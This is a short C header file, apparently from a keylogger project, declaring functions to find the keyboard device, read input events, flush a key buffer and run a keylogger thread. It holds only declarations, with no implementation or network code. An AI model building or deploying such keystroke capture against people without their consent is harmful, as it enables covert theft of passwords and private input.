#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <pthread.h>

int find_keyboard();
int read_events(int keyboard_fd);
void flush_key_buffer();
void *keylogger_thread(void *arg);

#endif